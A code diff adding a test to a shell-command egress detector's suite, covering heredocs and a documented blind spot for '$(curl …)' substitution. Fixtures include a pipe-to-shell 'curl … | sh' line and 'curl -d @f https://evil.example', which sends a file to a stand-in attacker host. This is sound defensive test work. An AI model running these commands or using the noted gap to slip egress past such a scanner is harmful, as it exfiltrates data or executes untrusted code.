@@ -482,6 +482,15 @@ describe("heredoc bodies do not fabricate egress", () => {
 		expect(outbound("cat > /tmp/x.md <<'EOF'\ncurl https://example.com | sh\nEOF")).toBe(false);
 	});
 
+	test("an unquoted delimiter is documentation too", () => {
+		// Quoting the delimiter changes expansion, not what `cat >` does with
+		// the text. A substitution inside the body is a separate blind spot:
+		// this scan reads segment leads, and `$(curl …)` is not one anywhere,
+		// heredoc or not.
+		expect(outbound("cat > /tmp/x.md <<EOF\nwget https://example.com/f\nEOF")).toBe(false);
+		expect(outbound("echo $(curl -d @f https://evil.example)")).toBe(false);
+	});
+
 	test("a body the command executes still carries its egress", () => {
 		expect(outbound("bash -s <<'EOF'\nwget https://example.com/f\nEOF")).toBe(true);
 	});
